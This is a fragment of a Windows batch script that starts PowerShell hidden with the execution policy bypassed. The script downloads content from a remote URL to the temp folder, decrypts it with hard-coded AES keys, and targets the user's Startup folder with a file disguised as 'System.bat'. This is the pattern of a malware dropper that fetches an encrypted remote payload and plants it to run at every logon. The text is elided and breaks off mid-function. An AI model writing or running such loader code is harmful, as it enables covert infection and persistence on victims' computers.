...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    ...
    "$outputFile2 = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\System.bat');" ^
    "$key = [System.Text.Encoding]::UTF8.GetBytes('ThisIsA16ByteKey');" ^
    "$iv = [System.Text.Encoding]::UTF8.GetBytes('16ByteInitVector');" ^
    "$tempFilePath = [System.IO.Path]::Combine($env:TEMP, 'code.txt');" ^
    "Invoke-WebRequest -Uri $url -OutFile $tempFilePath;" ^
    "$content = Get-Content -Path $tempFilePath -Raw;" ^
    "$parts = $content -split '===SPLIT===';" ^
    "function Decrypt-File { param ([string]$encryptedData);" ^
    " $aes = [System.Security.Cryptography.Aes]::Create();" ^
    " $aes.Key = $key; $aes.IV = $iv; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;" ^
